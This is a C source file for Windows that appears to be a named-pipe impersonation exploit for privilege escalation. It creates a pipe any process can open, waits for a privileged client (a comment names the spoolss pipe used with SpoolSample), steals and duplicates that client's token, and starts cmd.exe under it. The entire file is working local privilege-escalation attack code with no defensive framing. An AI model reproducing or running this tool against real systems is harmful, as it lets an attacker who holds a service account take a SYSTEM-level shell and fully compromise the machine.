#include <stdio.h>
#include <windows.h>
#include <namedpipeapi.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <Aclapi.h>

/* Create a DACL that will allow everyone to have full control over our pipe. */
static VOID BuildDACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    EXPLICIT_ACCESS ea;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;

    AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,
        &pSid);

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = FILE_ALL_ACCESS;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)pSid;

    if (SetEntriesInAcl(1, &ea, NULL, &pAcl) == ERROR_SUCCESS)
    {
        if (SetSecurityDescriptorDacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            printf(("[*] Failed to set DACL (0x%x)\n"), GetLastError());
    }
    else
        printf("[*] Failed to add ACE in DACL (0x%x)\n", GetLastError());
}


/* Create a SACL that will allow low integrity processes connect to our pipe. */
static VOID BuildSACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
    DWORD dwACLSize = sizeof(ACL) + sizeof(SYSTEM_MANDATORY_LABEL_ACE) +
        GetSidLengthRequired(1);

    pAcl = (PACL)LocalAlloc(LPTR, dwACLSize);
    InitializeAcl(pAcl, dwACLSize, ACL_REVISION);

    AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0,
        0, 0, 0, &pSid);

    if (AddMandatoryAce(pAcl, ACL_REVISION, 0, SYSTEM_MANDATORY_LABEL_NO_WRITE_UP,
        pSid) == TRUE)
    {
        if (SetSecurityDescriptorSacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            printf("[*] Failed to set SACL (0x%x)\n", GetLastError());
    }
    else
        printf("[*] Failed to add ACE in SACL (0x%x)\n", GetLastError());
}

/* Initialize security attributes to be used by `CreateNamedPipe()' below. */
static VOID InitSecurityAttributes(PSECURITY_ATTRIBUTES pAttributes)
{
    PSECURITY_DESCRIPTOR pDescriptor;

    pDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
        SECURITY_DESCRIPTOR_MIN_LENGTH);
    InitializeSecurityDescriptor(pDescriptor, SECURITY_DESCRIPTOR_REVISION);

    BuildDACL(pDescriptor);
    BuildSACL(pDescriptor);

    pAttributes->nLength = sizeof(SECURITY_ATTRIBUTES);
    pAttributes->lpSecurityDescriptor = pDescriptor;
    pAttributes->bInheritHandle = TRUE;
}

static void* create_np(char* p_name)
{
    SECURITY_ATTRIBUTES sa;
    InitSecurityAttributes(&sa);
    BOOL b_ret;


	void* p_pipe;
	p_pipe = CreateNamedPipeA(
		p_name,
		PIPE_ACCESS_DUPLEX,
		0,
		//PIPE_TYPE_BYTE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
		2, // Max instances
		0, // Out size
		0, //In size
		0, //Timeout
		&sa
		);
    if (p_pipe != INVALID_HANDLE_VALUE) {
        printf("[+] Pipe %s created\n", p_name);
        b_ret = ConnectNamedPipe(p_pipe, NULL);
        if (b_ret != FALSE) {
            return p_pipe;
        }
        printf("[-] Failed to connect to named pipe (0x%x)\n", GetLastError());
        CloseHandle((HANDLE)p_pipe);
    }
    else {
        printf("[-] Failed to create named pipe (0x%x)\n", GetLastError());
    }
    return NULL;
	
}

static void* impersonate(void* h_pipe) {
    BOOL b_ret;
    void* p_imp_token; // Impersonate
    void* p_d_token;   // Duplicated
    char* bytes[5];
    DWORD dwread;
    b_ret = ReadFile(h_pipe, (char*)bytes, 1, &dwread, NULL);

    if (b_ret != TRUE) {
        printf("[-] Failed to read file (0x%x)\n", GetLastError());
        return NULL;
    }
    b_ret = ImpersonateNamedPipeClient(h_pipe);
    if (b_ret != TRUE) {
        printf("[-] Failed to Impersonate named pipe client (0x%x)\n", GetLastError());
        return NULL;
    }

    b_ret = OpenThreadToken(
        GetCurrentThread(),
        TOKEN_ALL_ACCESS,
        //FALSE,
        TRUE,
        &p_imp_token
    );

    if (b_ret != TRUE) {
        printf("[-] Failed to open thread (0x%x)\n", GetLastError());
        return NULL;
    }


    b_ret = DuplicateTokenEx(p_imp_token, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &p_d_token);
    
    if (b_ret != TRUE) {
        printf("[-] Failed to Duplicate token (0x%x)\n", GetLastError());
        CloseHandle(p_imp_token);
        return NULL;
    }


    RevertToSelf();
    return p_d_token;
}

static int enable_privilege(void* ptoken, char* sepriv) {
    BOOL b_ret;
    LUID g_privluid;
    TOKEN_PRIVILEGES g_gtokenpriv;

    RtlSecureZeroMemory(&g_gtokenpriv, sizeof(TOKEN_PRIVILEGES));

    b_ret = LookupPrivilegeValueA(NULL, sepriv, &g_privluid);
    if (b_ret != TRUE) {
        printf("[-] Failed to lookup privilege value (0x%x)\n", GetLastError());
        return -1;
    }

    g_gtokenpriv.PrivilegeCount = 1;
    g_gtokenpriv.Privileges[0].Luid = g_privluid;
    g_gtokenpriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    b_ret = AdjustTokenPrivileges(
        ptoken,
        FALSE,
        &g_gtokenpriv,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL
    );

    if (b_ret != TRUE) {
        printf("[-] Failed to adjust token privileges(0x%x)\n", GetLastError());
        return -1;
    }

    return 0;
}

int main(int argc, char *argv[]) 
{
    if (argc < 2)
        printf("[-] Usage: %s \\\\.\\pipe\\name",argv[0]);
    BOOL b_ret;
    void* p_pipe;
    void* p_ptoken;
    void* p_itoken;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &p_ptoken);
    enable_privilege(p_ptoken, "SeImpersonatePrivilege");
    // FOR SPOOLSAMPLE USE SPOOLSS
    //p_pipe = create_np("\\\\.\\pipe\\test\\pipe\\spoolss");

    p_pipe = create_np(argv[1]);
    if (p_pipe != NULL) {
        printf("[+] Connection recieved\n");
        p_itoken = impersonate(p_pipe);

        DisconnectNamedPipe((HANDLE)p_pipe);
        CloseHandle(p_pipe);

        if (p_itoken != NULL) {
            printf("[*] Impersonating User\n");
            b_ret = ImpersonateNamedPipeClient(p_itoken);
            //b_ret = ImpersonateLoggedOnUser(p_itoken);
            if (b_ret == TRUE) {
                printf("[+] User impersonated\n");

            }
        }
        else {
            printf("[-] Failed to Impersonate user (0x%x)\n", GetLastError());
            return NULL;
        }
        printf("[*] Executing command\n");
        
        LPWSTR szCommandLine = L"C:\\Windows\\system32\\cmd.exe";
        STARTUPINFO StartupInfo;
        ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
        StartupInfo.cb = sizeof(STARTUPINFO);
        StartupInfo.lpDesktop = L"WinSta0\\Default";
        PROCESS_INFORMATION ProcessInformation;
        ZeroMemory(&ProcessInformation, sizeof(PROCESS_INFORMATION));
        

        b_ret = CreateProcessWithTokenW(p_itoken, NULL, NULL, szCommandLine, 0, NULL, NULL, &StartupInfo, &ProcessInformation);

        if (b_ret != TRUE) {
            printf("[-] Failed to create process (0x%x)\n", GetLastError());           
            return NULL;
        }
        printf("[*] Program executed\n");
    }
	return 0;
}

